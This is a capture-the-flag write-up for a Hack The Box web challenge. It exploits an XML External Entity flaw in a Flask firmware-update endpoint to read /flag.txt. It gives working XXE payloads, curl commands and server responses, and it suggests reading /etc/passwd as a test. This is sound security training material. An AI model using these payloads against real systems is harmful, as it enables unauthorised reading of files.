# HTB Try-Outs — "Jailbreak" (Web)

**Category:** Web  
**Difficulty:** Easy

---

## Challenge Description

> The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in `/flag.txt`

The challenge spawns a Docker instance exposed as an `IP:PORT` pair:

```text
154.57.164.82:31767
```

> The IP and port change every time the instance is respawned.

---

## Tooling

- `curl` — to send requests and read raw responses and headers
- A text editor — to build an XML payload

No VPN is required; the instance is reachable directly over the Internet.

---

## Recon: a Pip-Boy Web App

A first request shows a Flask application styled as a Fallout Pip-Boy ("PIP-OS(R) V1.33.7"):

```bash
curl -i http://154.57.164.82:31767
```

```text
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
```

The navigation bar exposes several routes:

```text
/            STAT
/inventory   INV
/data        DATA
/map         MAP
/radio       RADIO
/rom         ROM
```

The challenge story mentions a "custom firmware" used to jailbreak the device, so the **ROM** page — the only one that looks like it manages firmware — is the natural place to start.

---

## Finding the Firmware Update Page

```bash
curl -s http://154.57.164.82:31767/rom
```

The page is a **Firmware Update** form:

```html
<h2>Firmware Update</h2>
<p>Enter an update configuration file in the appropriate format <i>(XML)</i></p>
<textarea id="configData" ...></textarea>
<button id="updateBtn" ...>Submit</button>
<pre id="messageText" ...></pre>
```

A text box that takes **XML** and submits it to an update endpoint is a classic candidate for an **XML External Entity (XXE)** injection.

---

## Reading the Client-Side Code

The page loads `update.js`, which reveals both the API endpoint and the exact XML format the server expects:

```bash
curl -s http://154.57.164.82:31767/static/js/update.js
```

```javascript
const queueUpdate = async (xmlConfig) => {
    const response = await fetch("/api/update", {
        method: "POST",
        headers: { "Content-Type": "application/xml" },
        body: xmlConfig
    });
    return await response.json();
}
```

The script also pre-fills the textarea with a sample configuration:

```xml
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

This is the exact structure `POST /api/update` expects, with `Content-Type: application/xml`.

---

## Finding the Reflected Field

Before injecting anything, it's worth sending the sample XML as-is to see what the response looks like and, more importantly, **which field is echoed back**:

```bash
cat > payload.xml <<'EOF'
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <Description>test</Description>
    </Firmware>
</FirmwareUpdateConfig>
EOF

curl -s -X POST http://154.57.164.82:31767/api/update \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml
```

```json
{
  "message": "Firmware version 1.33.7 update initiated."
}
```

The response reflects the `<Version>` value inside `<Firmware>`, not `<Description>`. This is the injection point: whatever is placed in `<Version>` ends up in the JSON response, which is exactly what's needed to exfiltrate data via XXE.

---

## Building the XXE Payload

A standard XXE payload declares an external entity pointing at a local file and references it where the output will be reflected:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE FirmwareUpdateConfig [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        ...
    </Firmware>
</FirmwareUpdateConfig>
```

Sending this as-is fails:

```json
{
  "message": "An error occurred: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration."
}
```

This error is characteristic of Python's `lxml`: when the server receives the body as an already-decoded Unicode string and passes it to `lxml.etree.fromstring()`, an XML declaration with an `encoding=` attribute is rejected (`lxml` requires raw bytes for encoding declarations to be honored). Crucially, the error is about the **declaration**, not about the `DOCTYPE` or the external entity — confirming the parser does **not** block `DOCTYPE`/XXE, which is the real vulnerability here.

The fix is simply to drop the `<?xml ... ?>` declaration line and keep the `DOCTYPE`:

```xml
<!DOCTYPE FirmwareUpdateConfig [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>test</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>test</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

```bash
cat > payload.xml <<'EOF'
<!DOCTYPE FirmwareUpdateConfig [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>test</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>test</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
EOF

curl -s -X POST http://154.57.164.82:31767/api/update \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml
```

---

## The Flag

The server parses the `DOCTYPE`, resolves the external entity against the local filesystem, substitutes `&xxe;` with the content of `/flag.txt`, and reflects it back in the `Version` field of the JSON response:

```json
{
  "message": "Firmware version HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_1aff60012c5adb3416f2e64c1bc0840d} update initiated."
}
```

```text
HTB{REDACTED}
```

---

## Takeaways

- Any form or API endpoint that accepts raw **XML** is worth testing for **XXE**, especially when the application itself frames the feature as "firmware" or "configuration" upload — a strong hint that an XML parser sits directly behind it.
- Before injecting, find out **which field is reflected** back to you. Sending the untouched sample payload first and comparing it to the response is a quick, low-noise way to map input fields to output fields.
- An error message can be more useful than it looks. Here, "Unicode strings with encoding declaration are not supported" was not a dead end — it told us exactly which part of the XML (`<?xml ... encoding=... ?>`) to strip, while confirming the `DOCTYPE` itself was accepted.
- XXE doesn't require a verbose "out-of-band" or blind technique when the application already reflects data back to the client: a basic in-band entity (`<!ENTITY xxe SYSTEM "file:///path">`) referenced in a reflected field is often enough to read local files directly.
- As always with file-read primitives, `file:///etc/passwd` is a useful sanity check before targeting the actual goal (`file:///flag.txt`), to confirm the entity resolves at all.
